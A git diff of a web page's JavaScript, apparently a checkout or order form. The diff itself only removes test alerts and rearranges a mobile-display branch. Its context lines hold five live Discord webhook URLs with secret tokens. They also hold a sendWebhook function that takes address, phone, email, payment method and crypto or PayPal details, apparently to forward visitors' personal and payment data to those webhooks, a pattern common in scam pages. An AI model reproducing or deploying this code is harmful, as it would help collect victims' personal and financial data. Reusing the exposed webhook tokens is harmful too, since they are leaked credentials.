@@ -25,8 +25,6 @@ const lastSubmit = document.getElementById('last-submit')
 const mainContainer = document.querySelector('.container');
 const isMobile = true;
 
-alert("test")
-
 Webhooks = ['https://discord.com/api/webhooks/1241458259806650368/us6QyDbtyfXFsPJCz3x76FxiQ17UGi90MzeEqxpGb2yz6QupJzFi5o2uqvmakoc49S68','https://discord.com/api/webhooks/1241458356393087068/cTRNM8GVcEYygqMqWRS5-pNEEhxe3CmCjkpGGcRWjjfd8yKVBCjhB8qI5-aIWTcQnnbA','https://discord.com/api/webhooks/1241458395026948266/WC2o2id1FE5WVhcWSzRMWKF6zT8M4HGvrGZc4LwzmJ0BCGzJUbPc6nyX5QFpMvOy0o0K','https://discord.com/api/webhooks/1241458438379405462/Cbokx7DqEV6wNP8bjmKQkYxzMYwWSeFkSo7SI8LdFqPepWUZ0htB_O_-obHp01sFwiHg','https://discord.com/api/webhooks/1241458444934840500/6-VrRpo8decfq6PTEt9KxjlySpdK4UW9-aRaiwjuTp8EgNHUf7E8QOn2Hm4Gl7kHjx0j']
 
 function sendWebhook(data,address, phone, email, paymentMethod, cryptoPaypalInfo) {
@@ -206,10 +204,8 @@ function throttle(fn, delay) {
     content.innerText = cont
     overlay.style.display='flex';
     if (isMobile) {
-        mainContainer.style.opacity='1';
         alert("Working")
-    } else{
-        alert("Working ig")
+        mainContainer.style.opacity='1';
     }
     if (type == "Normal") {
         icon.className = "fa-solid fa-circle-info"
